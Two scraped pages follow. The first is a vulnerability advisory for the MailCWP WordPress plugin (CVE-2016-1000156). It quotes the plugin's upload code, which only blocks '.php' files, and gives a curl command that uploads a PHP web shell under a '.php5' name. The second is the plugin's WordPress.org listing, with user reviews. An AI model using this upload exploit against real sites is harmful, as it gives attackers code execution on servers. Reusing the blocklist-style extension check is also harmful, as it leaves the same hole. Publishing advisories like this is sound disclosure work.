=== Content from www.vapidlabs.com_257dca4d_20250125_232038.html ===


| Advisory #: 175 |
| --- |
| **Title:** Mailcwp remote file upload vulnerability incomplete fix v1.100 |
| **Author:** Larry W. Cashdollar, @\_larry0 |
| **Date:** 2016-11-01 |
| **CVE-ID:**[[CVE-2016-1000156](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-1000156)] |
| **CWE:** |
| **Download Site:** <https://wordpress.org/plugins/mailcwp/> |
| **Vendor:** CadreWorks Pty Ltd |
| **Vendor Notified:**  2016-11-01 |
| **Vendor Contact:** plugins@wordpress.org |
| **Advisory:** <www.vapidlabs.com/advisory.php?v=175> |
| **Description:** MailCWP, Mail Client for WordPress. A full-featured mail client plugin providing webmail access through your WordPress blog or website. |
| **Vulnerability:**I noticed CVE-2015-1000000 wasn't fixed correctly, \_any\_ authenticated user can upload a file to the WordPress installation, they can get .php code execution by changing the extension to .php[3-5], .pht or .phtml. My previous advisory: http://www.vapidlabs.com/advisory.php?v=138 require\_once "../../../wp-load.php"; if (!is\_user\_logged\_in()) { die('{"ERROR": -1}'); } $message\_id = $\_REQUEST["message\_id"]; $upload\_dir = $\_REQUEST["upload\_dir"]; if (empty($\_FILES) || $\_FILES["file"]["error"]) { die('{"OK": 0}'); } $fileName = $\_FILES["file"]["name"]; $ext = pathinfo($fileName, PATHINFO\_EXTENSION); if ($ext == 'php') { die('{"ERROR": -2}'); } move\_uploaded\_file($\_FILES["file"]["tmp\_name"], "$upload\_dir/$message\_id-$fileName"); die('{"OK": 1}'); |
| **Export:** [JSON](export_mitre_v4.py?id=175) [TEXT](txt.php?v=175) [XML](xml.php?s=175) |
| **Exploit Code:** ```   1. Create any type of user and [copy](http://www.php.net/copy) the contents of your cookie [file](http://www.php.net/file) for curl: 3. $ curl   -F "file=@/home/larry/shell.php5" "http://example.com/wp-content/plugins/mailcwp/mailcwp-upload.php?message_id=1" -F "upload_dir=/usr/share/wordpress/wp-content/uploads" --cookie cookie.txt 4. {"OK": 1}  ``` |
| **Screen Shots:** |
| **Notes:** ``` Incomplete fix for CVE-2015-1000000 ``` |



=== Content from wordpress.org_23cc67b5_20250126_124440.html ===


[WordPress.org](https://wordpress.org/)

* [News](https://wordpress.org/news/)
* [Showcase](https://wordpress.org/showcase/)
* [Hosting](https://wordpress.org/hosting/)
* Extend
  + [Themes](https://wordpress.org/themes/)
  + [Plugins](https://wordpress.org/plugins/)
  + [Patterns](https://wordpress.org/patterns/)
  + [Blocks](https://wordpress.org/blocks/)
  + [Openverse ↗︎](https://openverse.org/)
* Learn
  + [Learn WordPress](https://learn.wordpress.org/)
  + [Documentation](https://wordpress.org/documentation/)
  + [Forums](https://wordpress.org/support/forums/)
  + [Developers](https://developer.wordpress.org/)
  + [WordPress.tv ↗︎](https://wordpress.tv/)
* Community
  + [Make WordPress](https://make.wordpress.org/)
  + [Photo Directory](https://wordpress.org/photos/)
  + [Five for the Future](https://wordpress.org/five-for-the-future/)
  + [Events](https://events.wordpress.org/)
  + [Job Board ↗︎](https://jobs.wordpress.net/)
* About
  + [About WordPress](https://wordpress.org/about/)
  + [Enterprise](https://wordpress.org/enterprise/)
  + [Gutenberg ↗︎](https://wordpress.org/gutenberg/)
* [Get WordPress](https://wordpress.org/download/)

Search in WordPress.org

[Get WordPress](https://wordpress.org/download/)

[WordPress.org](https://wordpress.org/)

[Plugin Directory](https://wordpress.org/plugins/)

MailCWP

* [Submit a plugin](https://wordpress.org/plugins/developers/)
* [My favorites](https://wordpress.org/plugins/browse/favorites/)
* [Log in](https://login.wordpress.org/?redirect_to=https%3A%2F%2Fwordpress.org%2Fplugins%2Fmailcwp&locale=en_US)

* [Submit a plugin](https://wordpress.org/plugins/developers/)
* [My favorites](https://wordpress.org/plugins/browse/favorites/)
* [Log in](https://login.wordpress.org/?redirect_to=https%3A%2F%2Fwordpress.org%2Fplugins%2Fmailcwp&locale=en_US)

Search plugins

![](https://s.w.org/plugins/geopattern-icon/mailcwp_bab9b4.svg)
# mailcwp

By [CadreWorks Pty Ltd](http://cadreworks.com)

* [Details](https://wordpress.org/plugins/mailcwp/#description)
* [Reviews](https://wordpress.org/plugins/mailcwp/#reviews)
* [Development](https://wordpress.org/plugins/mailcwp/#developers)

[Support](https://wordpress.org/support/plugin/mailcwp/)

## Description

This plugin has been closed as of September 22, 2015 and is not available for download. Reason: Unknown.

## Reviews

![](https://secure.gravatar.com/avatar/1151208a2fd711cd1d21045606328435706eaca6f242fd88a29807a9310cc352?s=60&d=retro&r=g)
### [this plugin is very useful](https://wordpress.org/support/topic/this-plugin-is-very-useful-1/)

[mohamedh](https://profiles.wordpress.org/mohamedh/ "Posts by mohamedh")
September 3, 2016

this plugin is very useful, it does exactly it’s job, I needed to make my blog users, able to go to their inbox without leaving my blog and having to open their mail client/mail website in a separate tab. and the plugin does the job

![](https://secure.gravatar.com/avatar/661f2d43ece45f72666766fd36dbb5b6e6112bed8e69719a48e3d88633e74325?s=60&d=retro&r=g)
### [GREAT IDEA – it works but…](https://wordpress.org/support/topic/great-idea-it-works-but/)

[OpenRing](https://profiles.wordpress.org/openring/ "Posts by OpenRing")
September 3, 2016

I’m trying to figure out how to show the Attachment Column. Any idea?
A few suggestions:
– passwords MUST be Encrypted!! Please do it in the next release!
– show a column witch tells you if the message has got attachments.
– add a “clean theme” to leave WordPress Theme to manage CSS and look.
The plug-in is wonderful, really a fantastic idea.
Let me know if you can help me.
Best regards.

![](https://secure.gravatar.com/avatar/e50c3d09d93129c7741a202a0b7f8b0f1d169dcfba5aded8e48ed7ac5a1b939d?s=60&d=retro&r=g)
### [Stores email passwords in the clear](https://wordpress.org/support/topic/stores-email-passwords-in-the-clear/)

[Earnest Boyd](https://profiles.wordpress.org/eboyd53/ "Posts by Earnest Boyd")
September 3, 2016

The passwords for the email accounts given are stored in the database in clear text and easily viewed should your database be hacked. Fortunately I texted this in a private development environment To improve this the passwords need to be encrypted and a decryption key placed elsewhere be used.

[Read all 13 reviews](https://wordpress.org/support/plugin/mailcwp/reviews/)
## Contributors & Developers

“MailCWP” is open source software. The following people have contributed to this plugin.

Contributors

* ![](https://secure.gravatar.com/avatar/713f6ad7666fa536aa697e22e5f0b8714ec1fa3e82dfb023b787f594a9b73769?s=32&d=mm&r=g) [Warrick](https://profiles.wordpress.org/wzedi/)

[Translate “MailCWP” into your language.](https://translate.wordpress.org/projects/wp-plugins/mailcwp)

### Interested in development?

[Browse the code](https://plugins.trac.wordpress.org/browser/mailcwp/), check out the [SVN repository](https://plugins.svn.wordpress.org/mailcwp/), or subscribe to the [development log](https://plugins.trac.wordpress.org/log/mailcwp/) by [RSS](https://plugins.trac.wordpress.org/log/mailcwp/?limit=100&mode=stop_on_copy&format=rss).

## Meta

* Version **1.100**
* Last updated **9 years ago**
* Active installations **N/A**
* WordPress version **3.8.0 or higher**
* Tested up to **4.2.38**
* [Advanced View](https://wordpress.org/plugins/mailcwp/advanced/)

* [About](https://wordpress.org/about/)
* [News](https://wordpress.org/news/)
* [Hosting](https://wordpress.org/hosting/)
* [Privacy](https://wordpress.org/about/privacy/)

* [Showcase](https://wordpress.org/showcase/)
* [Themes](https://wordpress.org/themes/)
* [Plugins](https://wordpress.org/plugins/)
* [Patterns](https://wordpress.org/patterns/)

* [Learn](https://learn.wordpress.org/)
* [Documentation](https://wordpress.org/documentation/)
* [Developers](https://developer.wordpress.org/)
* [WordPress.tv ↗](https://wordpress.tv/)

* [Get Involved](https://make.wordpress.org/)
* [Events](https://events.wordpress.org/)
* [Donate ↗](https://wordpressfoundation.org/donate/)
* [Five for the Future](https://wordpress.org/five-for-the-future/)

* [WordPress.com ↗](https://wordpress.com/?ref=wporg-footer)
* [Matt ↗](https://ma.tt/)
* [bbPress ↗](https://bbpress.org/)
* [BuddyPress ↗](https://buddypress.org/)

[WordPress.org](https://wordpress.org/)

[WordPress.org](https://wordpress.org/)

* [Visit our Facebook page](https://www.facebook.com/WordPress/)
* [Visit our X (formerly Twitter) account](https://www.x.com/WordPress)
* [Visit our Instagram account](https://www.instagram.com/wordpress/)
* [Visit our LinkedIn account](https://www.linkedin.com/company/wordpress)
* [Visit our YouTube channel](https://www.youtube.com/wordpress)

![Code is Poetry](https://s.w.org/style/images/code-is-poetry-for-dark-bg.svg)


